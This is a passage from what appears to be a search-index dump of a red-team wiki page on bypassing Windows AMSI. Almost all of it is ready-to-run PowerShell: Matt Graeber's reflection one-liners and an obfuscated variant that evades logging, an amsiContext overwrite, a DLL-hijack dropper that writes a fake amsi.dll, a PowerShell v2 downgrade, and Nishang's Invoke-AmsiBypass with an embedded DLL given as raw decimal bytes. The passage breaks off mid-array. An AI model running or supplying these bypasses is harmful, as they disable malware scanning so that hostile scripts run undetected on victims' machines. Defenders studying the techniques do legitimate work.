0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 6, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 96, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | \n    Out-Null;\n    Write-Output \"DLL has been reflected\";\n  }\n  [Bypass.AMSI]::Patch();\n}\nMyPatch;\nStart-Sleep 1;\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#using-matt-graebers-reflection-method","title":"Using Matt Graebers Reflection method","text":"<pre><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#using-matt-graebers-reflection-method-with-wmf5-autologging-bypass","title":"Using Matt Graebers Reflection method with WMF5 autologging bypass","text":"<pre><code>[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#using-matt-graebers-second-reflection-method","title":"Using Matt Graebers second Reflection method","text":"<pre><code>[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#using-cornelis-de-plaas-dll-hijack-method","title":"Using Cornelis de Plaas DLL hijack method","text":"<pre><code>[Byte[]] $temp = $DllBytes -split ' '                \nWrite-Output \"Executing the bypass.\"\nWrite-Verbose \"Dropping the fake amsi.dll to disk.\"\n[System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp)\n\nWrite-Verbose \"Copying powershell.exe to the current working directory.\"\nCopy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd\n\nWrite-Verbose \"Starting powershell.exe from the current working directory.\"\n&amp; \"$pwd\\powershell.exe\"\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#using-powershell-version-2","title":"Using PowerShell version 2","text":"<pre><code>if ($ShowOnly -eq $True)\n{\n        Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\"\n}\nelse\n{\n        Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\"\n        $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version\n    if($versions -match \"2.0.50727\")\n    {\n            Write-Verbose \".Net version 2.0.50727 found.\"\n            Write-Output \"Executing the bypass.\"\n            powershell.exe -version 2\n    }\n    else\n    {\n            Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\"\n    }\n}\n</code></pre>"},{"location":"redteam/evasion/windows-amsi-bypass/#nishang-all-in-one","title":"Nishang all in one","text":"<pre><code>function Invoke-AmsiBypass\n{\n&lt;#\n.SYNOPSIS\nNishang script which uses publicly known methods to bypass/avoid AMSI.\n\n.DESCRIPTION\nThis script implements publicly known methods bypass or avoid AMSI on Windows machines.\n\nAMSI is a script malware detection mechanism enabled by default in Windows 10. \n(https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx)\n\nThis script implements 6 methods of bypassing AMSI.\nunload - Method by Matt Graeber. Unloads AMSI from current PowerShell session.\nunload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session.\nunloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging.\nunloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. \ndllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) \npsv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI.\n\nThe script also provides information on tools which can be used for obfuscation:\nISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/)\nInvoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)\n\n.PARAMETER Method\nThe method to be used for elevation. Defaut one is unloadsilent.\n\n.PARAMETER ShowOnly\nThe bypass is not executed. Just shown to the user. \n\n.EXAMPLE\nPS &gt; Invoke-AmsiBypass -Verbose\nAbove command runs the unloadsilent method.\n\n.EXAMPLE\nPS &gt; Invoke-PsUACme -Method unloadobfuscated -Verbose\nAbove command runs the unloadobfuscated method.\n\n.LINK\nhttp://www.labofapenetrationtester.com/2016/09/amsi.html\nhttps://github.com/samratashok/nishang\n#&gt;\n\n\n    [CmdletBinding()] Param(\n\n        [Parameter(Position = 0, Mandatory = $False)]\n        [ValidateSet(\"unload\",\"unloadsilent\",\"unloadobfuscated\",\"unload2\",\"dllhijack\",\"psv2\",\"obfuscation\")]\n        [String]\n        $Method = \"unloadsilent\",\n\n        [Parameter(Position = 1, Mandatory = $False)]\n        [Switch]\n        $ShowOnly\n    )\n\n    $AmsiX86 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 